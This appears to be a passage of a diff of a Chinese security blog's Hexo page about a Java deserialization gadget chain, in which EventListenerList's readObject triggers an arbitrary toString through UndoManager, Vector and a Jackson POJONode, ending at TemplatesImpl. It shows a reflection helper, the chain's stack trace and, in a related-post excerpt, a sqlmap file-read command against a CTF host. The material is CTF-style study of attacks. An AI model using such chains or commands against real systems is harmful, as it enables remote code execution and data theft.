class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeJoinpointUsingReflection:344, AopUtils (org.springframework.aop.support)</span><br><span class="line">invoke:208, JdkDynamicAopProxy (org.springframework.aop.framework)</span><br><span class="line">getOutputProperties:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:115, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:59, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">toString:462, AbstractCollection (java.util)</span><br><span class="line">toString:1003, Vector (java.util)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">toString:258, CompoundEdit (javax.swing.undo)</span><br><span class="line">toString:621, UndoManager (javax.swing.undo)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">add:187, EventListenerList (javax.swing.event)</span><br><span class="line">readObject:277, EventListenerList (javax.swing.event)</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>invokeJoinpointUsingReflection:<span class="hljs-number">344</span>, AopUtils (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.support)<br>invoke:<span class="hljs-number">208</span>, JdkDynamicAopProxy (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.framework)<br>getOutputProperties:-<span class="hljs-number">1</span>, <span class="hljs-variable">$Proxy0</span> (com<span class="hljs-selector-class">.sun</span>.proxy)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>serializeAsField:<span class="hljs-number">689</span>, BeanPropertyWriter (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>serializeFields:<span class="hljs-number">774</span>, BeanSerializerBase (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.ser</span>.std)<br>serialize:<span class="hljs-number">178</span>, BeanSerializer (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>defaultSerializeValue:<span class="hljs-number">1142</span>, SerializerProvider (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>serialize:<span class="hljs-number">115</span>, POJONode (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node)<br>serialize:<span class="hljs-number">39</span>, SerializableSerializer (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.ser</span>.std)<br>serialize:<span class="hljs-number">20</span>, SerializableSerializer (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.ser</span>.std)<br>_serialize:<span class="hljs-number">480</span>, DefaultSerializerProvider (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>serializeValue:<span class="hljs-number">319</span>, DefaultSerializerProvider (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>serialize:<span class="hljs-number">1518</span>, ObjectWriter<span class="hljs-variable">$Prefetch</span> (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>_writeValueAndClose:<span class="hljs-number">1219</span>, ObjectWriter (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>writeValueAsString:<span class="hljs-number">1086</span>, ObjectWriter (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>nodeToString:<span class="hljs-number">30</span>, InternalNodeMapper (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node)<br>toString:<span class="hljs-number">59</span>, BaseJsonNode (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node)<br>valueOf:<span class="hljs-number">2994</span>, String (java.lang)<br>append:<span class="hljs-number">131</span>, StringBuilder (java.lang)<br>toString:<span class="hljs-number">462</span>, AbstractCollection (java.util)<br>toString:<span class="hljs-number">1003</span>, Vector (java.util)<br>valueOf:<span class="hljs-number">2994</span>, String (java.lang)<br>append:<span class="hljs-number">131</span>, StringBuilder (java.lang)<br>toString:<span class="hljs-number">258</span>, CompoundEdit (javax<span class="hljs-selector-class">.swing</span>.undo)<br>toString:<span class="hljs-number">621</span>, UndoManager (javax<span class="hljs-selector-class">.swing</span>.undo)<br>valueOf:<span class="hljs-number">2994</span>, String (java.lang)<br>append:<span class="hljs-number">131</span>, StringBuilder (java.lang)<br>add:<span class="hljs-number">187</span>, EventListenerList (javax<span class="hljs-selector-class">.swing</span>.event)<br>readObject:<span class="hljs-number">277</span>, EventListenerList (javax<span class="hljs-selector-class">.swing</span>.event)<br></code></pre></td></tr></table></figure>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lvyzcc.github.io">LvYz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lvyzcc.github.io/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/">https://lvyzcc.github.io/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lvyzcc.github.io" target="_blank">LvYz的小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JAVA/">JAVA</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/18/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java二次反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">java二次反序列化</div></div><div class="info-2"><div class="info-item-1">适合场景很多java题目，大都弄了个类继承ObjectInputStream，重写其resolveClass方法，在里面添加对反序列化类黑名单的校验。 javaGuidepublic String deserialize(@RequestParam String payload) &#123;        byte[] decode = Base64.getDecoder().decode(payload);        try &#123;            MyObjectInputStream myObjectInputStream = new MyObjectInputStream(new ByteArrayInputStream(decode));            myObjectInputStream.readObject();            return &quot;ok&quot;;        &#125; catch (InvalidClassException e) &#123;            return...</div></div></div></a><a class="pagination-related" href="/2025/04/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDay2/" title="春秋云镜Day2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">春秋云镜Day2</div></div><div class="info-2"><div class="info-item-1">CVE-2022-25488靶标介绍：Atom CMS v2.0存在sql注入漏洞在&#x2F;admin&#x2F;ajax&#x2F;avatar.php页面 解题 打开网页发现一片空白，尝试读取ajax目录  发现存在的许多php文件  点进去发现是一个sql语句错误，根据id属性去检索数据，我们传入参数id到sqlmap扫描  扫描成功，id属性存在sql注入漏洞，直接sqlmap梭哈结束 python sqlmap.py -u http://xxx.ichunqiu.com/admin/ajax/avatar.php?id=1 --batch --file-read &quot;/flag&quot; --dbms mysql   CVE-2022-25578靶标介绍：taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码 缓解措施 避免编辑服务器配置文件：除非必要，否则不要编辑 .htaccess...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/" title="JAVA反序列化CC6链"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">JAVA反序列化CC6链</div></div><div class="info-2"><div class="info-item-1">0x01环境配置 Jdk 8u71  Comoons-Collections 3.2.1   0x02 触发链过程HashMap.readObject()HashMap.hash()    TiedMapEntry.hashCode()    TiedMapEntry.getValue()        LazyMap.get()            ChainedTransformer.transform()                InvokerTransformer.transform()                    Method.invoke()                        Runtime.exec()  0X03 过程分析CC6链我们主要分析从readObject到LazyMap的get函数，这之后触发的链子可变化的样式较多。 第一步：LazyMap-&gt;transform public static Map decorate(Map map, Factory factory) &#123;        return new...</div></div></div></a><a class="pagination-related" href="/2025/03/29/Polar-JAVA%E9%A2%98WP/" title="Polar_JAVA题WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-29</div><div class="info-item-2">Polar_JAVA题WP</div></div><div class="info-2"><div class="info-item-1">[Polar]EzJava题目来源：Polar 题目类型：WEB 设计考点：Spel任意命令执行  认识SpELSpring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。  基本用法:SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值 示例1:不注册新变量的用法ExpressionParser parser = new SpelExpressionParser();//创建解析器Expression exp = parser.parseExpression(&quot;&#x27;Hello...</div></div></div></a><a class="pagination-related" href="/2025/04/18/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="fastjson原生反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-18</div><div class="info-item-2">fastjson原生反序列化</div></div><div class="info-2"><div class="info-item-1">fastjson 1.2.48版本和依赖jdk：1.8.0_66 maven： &lt;dependency&gt;  &lt;groupId&gt;org.javassist&lt;/groupId&gt;  &lt;artifactId&gt;javassist&lt;/artifactId&gt;  &lt;version&gt;3.19.0-GA&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt; ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LvYz</div><div class="author-info-description">WebDog你知道的啊</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/LvYzCc" target="_blank" title=""><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString"><span class="toc-number">1.</span> <span class="toc-text">EventListenerList触发任意toString</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#javax-swing-event-EventListenerList-readObject"><span class="toc-number">1.1.1.</span> <span class="toc-text">javax.swing.event.EventListenerList#readObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#javax-swing-undo-UndoManager-toString"><span class="toc-number">1.1.2.</span> <span class="toc-text">javax.swing.undo.UndoManager#toString</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java-util-Vector-toString"><span class="toc-number">1.1.3.</span> <span class="toc-text">java.util.Vector#toString</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDay2/" title="春秋云镜Day2">春秋云镜Day2</a><time datetime="2025-04-20T03:16:07.000Z" title="发表于 2025-04-20 11:16:07">2025-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/" title="EventListenerList触发任意toString">EventListenerList触发任意toString</a><time datetime="2025-04-19T05:54:49.000Z" title="发表于 2025-04-19 13:54:49">2025-04-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/18/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java二次反序列化">java二次反序列化</a><time datetime="2025-04-18T08:27:41.000Z" title="发表于 2025-04-18 16:27:41">2025-04-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/18/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="fastjson原生反序列化">fastjson原生反序列化</a><time datetime="2025-04-18T07:49:15.000Z" title="发表于 2025-04-18 15:49:15">2025-04-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/13/TGCTF2025/" title="TGCTF2025">TGCTF2025</a><time datetime="2025-04-13T03:01:21.000Z" title="发表于 2025-04-13 11:01:21">2025-04-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By LvYz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.2.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="category-chain-item">知识点</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JAVA/" class="print-no-link">#JAVA</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>EventListenerList触发任意toString</div>
+      <div>https://lvyzcc.github.io/2025/04/19/EventListenerList触发任意toString/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>LvYz</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDay2/" title="春秋云镜Day2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜Day2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/18/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java二次反序列化">
+                        <span class="hidden-mobile">java二次反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
